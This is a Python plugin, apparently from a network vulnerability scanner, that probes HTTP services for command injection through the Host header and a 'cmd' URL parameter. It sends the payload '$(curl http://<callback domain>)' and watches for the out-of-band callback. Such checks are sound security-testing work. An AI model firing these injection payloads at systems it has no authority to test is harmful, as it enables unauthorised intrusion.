#!/usr/bin/env python
# encoding=utf-8

from lib.poc.dummy import *
import ssl


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    try:
        domain = dns_monitor(ip, port).add_checker('host-header-command-inject',
                                                   alert_group='Host Header/URL Command Injection',
                                                   details='Host Header/URL Command Injection found')

        base_url = '%s://%s:%s' % (service, ip, port)
        payload = "GET {} HTTP/1.1\r\n" + \
                  "Host: {}\r\n".format("$(curl http://%s)" % domain) + \
                  "User-Agent: {}\r\n".format(GLOBAL_USER_AGENT) + \
                  "Connection: close\r\n\r\n"

        payload = payload.format(base_url + '/?cmd=$(curl http://%s)' % domain)

        if service == 'https':
            ssl_context = ssl._create_unverified_context()
            reader, writer = await asyncio.open_connection(ip, port, ssl=ssl_context)
        else:
            reader, writer = await asyncio.open_connection(ip, port)

        writer.write(payload.encode())
        await writer.drain()
        await asyncio.wait_for(reader.read(1000), 5)
        writer.close()
        try:
            await writer.wait_closed()    # application data after close notify (_ssl.c:2730)
        except Exception as e:
            pass

    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8090, 'http', True, task_msg={})
    run_plugin_test(scan)
